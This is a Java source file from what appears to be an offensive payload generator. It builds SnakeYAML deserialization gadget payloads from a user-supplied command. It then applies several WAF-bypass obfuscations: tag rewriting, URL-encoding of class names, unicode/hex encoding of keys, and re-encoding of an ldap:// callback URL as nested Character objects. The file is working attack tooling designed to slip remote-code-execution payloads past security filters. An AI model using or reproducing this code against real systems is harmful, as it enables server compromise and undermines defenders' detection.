package cn.butler.snakeyaml.config;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.config.Config;
import cn.butler.utils.FileUtils;
import cn.butler.xstream.Serializer;
import org.apache.commons.cli.CommandLine;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SnakeYamlConfig extends Config {
    public void parse(CommandLine cmdLine){

        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("SnakeYamlAttack",payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object object = payload.getObject(command);
            if(cmdLine.hasOption("waf-bypass")){
                String waf_bypass_value = cmdLine.getOptionValue("waf-bypass");
                if(waf_bypass_value.equals("tag1")){
                    object = snakeYamlWafBypassTag1((String) object);
                } else if (waf_bypass_value.equals("tag2")) {
                    object = snakeYamlWafBypassTag2((String) object);
                } else if (waf_bypass_value.equals("classNameURLEncode")) {
                    object = snakeYamlWafBypassClassNameURLEncode((String) object);
                } else if (waf_bypass_value.equals("MixObf")) {
                    object = snakeYamlMixObf((String) object);
                }
            }
            if(cmdLine.hasOption("writeToFile")){
                String fileName = cmdLine.getOptionValue("writeToFile");
                String serialize = Serializer.serialize(object);
                FileUtils.savePayloadToFile(serialize,fileName);
                System.exit(0);
            }
            //原版的输出
            System.out.println(object);
            System.exit(0);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }

    private static Object snakeYamlWafBypassTag2(String input) {
        // 1. 添加 %TAG 和 ---
        String output = "%TAG !      tag:yaml.org,2002:\n---\n";
        // 2. 将 !! 开头的标记转换为 ! (保留 YAML 简单类型标记)
        output += input.replaceAll("!!", "!");
        return output;
    }

    private static String snakeYamlWafBypassTag1(String object){
        // 匹配所有 !!开头的类型并转换为 !<tag:yaml.org,2002:类型>
        String output = object.replaceAll("!!(\\S+)", "!<tag:yaml.org,2002:$1>");
        return output;
    }

    private static String snakeYamlWafBypassClassNameURLEncode(String input) throws Exception {
        // 正则表达式匹配类名 (形如 !!类名)
        Pattern pattern = Pattern.compile("!!(\\S+)");
        Matcher matcher = pattern.matcher(input);

        StringBuffer result = new StringBuffer();
        // 查找并对类名部分进行URL编码
        while (matcher.find()) {
            String className = matcher.group(1);  // 提取类名
            String encodedClassName = encodeClassName(className);
            matcher.appendReplacement(result, "!!" + encodedClassName);  // 替换为编码后的类名
        }
        matcher.appendTail(result);  // 添加剩余部分
        return result.toString();
    }

    private static String snakeYamlMixObf(String input) throws Exception {
        String text1 = snakeYamlWafBypassClassNameURLEncode(input); //类名编码
        String text2 = (String) snakeYamlWafBypassTag2(text1); //tag变换
        String text3 = obfuscateKeys(text2); //先混淆key
        String result = replaceLdapValueWithYaml(text3); //再混淆value
        return result;
    }

    public static String encodeClassName(String input) {
        StringBuilder encoded = new StringBuilder();
        for (char c : input.toCharArray()) {
            encoded.append('%');
            encoded.append(String.format("%02X", (int) c));
        }
        return encoded.toString();
    }

    /**
     * 1) 匹配 : ""
     * 2) 将引号内的字符串替换为
     *    !!java.lang.String [!!java.lang.StringBuilder [!!com.sun.xml.internal.fastinfoset.util.CharArray [[!!java.lang.Character "l",...],0,len,false]]]
     *
     * 保留 : 与原始空白（例如 ": "）的空格。
     */
    public static String replaceLdapValueWithYaml(String input) {
        // 匹配冒号、可选空白，然后双引号内以 ldap:// 开头的内容
        Pattern valPattern = Pattern.compile(":(\\s*)\"([^\"]*)\"");
        Matcher m = valPattern.matcher(input);
        StringBuffer sb = new StringBuffer();

        while (m.find()) {
            String whitespace = m.group(1);   // 包含冒号后的空白（例如一个空格）
            String inner = m.group(2);       // 引号内的 URL，例如 ldap://127.0.0.1:1389/
            String replacementYaml = buildJavaStringYaml(inner);
            String replacement = ":" + whitespace + replacementYaml;
            // 转义 replacement 以安全插入
            m.appendReplacement(sb, Matcher.quoteReplacement(replacement));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    /**
     * 将字符串 s 转成指定的 YAML/serialization 结构（按字符展开为 !!java.lang.Character）
     * 例子输出类似：
     * !!java.lang.String [!!java.lang.StringBuilder [!!com.sun.xml.internal.fastinfoset.util.CharArray [[!!java.lang.Character "l",!!java.lang.Character "d",...],0,22,false]]]
     */
    public static String buildJavaStringYaml(String s) {
        StringBuilder charList = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            // 对引号和反斜杠等在 YAML 中保留为原字符（我们这里直接放双引号包裹）
            // 每个字符项形如: !!java.lang.Character "l"
            charList.append("!!java.lang.Character \"");
            // 如果字符本身是双引号或反斜杠，进行转义为 \\" 或 \\ 在 YAML 字面里
            if (ch == '\\') {
                charList.append("\\\\"); // 在字符串中需要两个反斜杠表示一个反斜杠
            } else if (ch == '"') {
                charList.append("\\\""); // 转义引号
            } else {
                charList.append(ch);
            }
            charList.append("\"");
            if (i != s.length() - 1) charList.append(",");
        }

        int len = s.length();
        // 组合成最终结构
        StringBuilder out = new StringBuilder();
        out.append("!!java.lang.String [!!java.lang.StringBuilder [!!com.sun.xml.internal.fastinfoset.util.CharArray [[");
        out.append(charList.toString());
        out.append("],0,").append(len).append(",false]]]");
        return out.toString();
    }

    /**
     * 匹配 "key": 格式，并将 key 转为 Unicode + Hex 混淆
     */
    public static String obfuscateKeys(String input) {
        Pattern pattern = Pattern.compile("\"([^\"]+)\":");
        Matcher matcher = pattern.matcher(input);
        StringBuffer sb = new StringBuffer();

        while (matcher.find()) {
            String key = matcher.group(1);
            String obfuscatedKey = unicodeHexEncode(key);
            // 替换原 key 为混淆后的 key
            matcher.appendReplacement(sb, "\"" + obfuscatedKey + "\":");
        }
        matcher.appendTail(sb);
        return sb.toString();
    }

    /**
     * 将字符串混淆为 Unicode + Hex 编码，输出中每个 \ 都加上转义
     */
    public static String unicodeHexEncode(String input) {
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            if (Math.random() < 0.5) {
                sb.append("\\\\u").append(String.format("%04x", (int)c));
            } else {
                sb.append("\\\\x").append(String.format("%02x", (int)c));
            }
        }
        return sb.toString();
    }
}
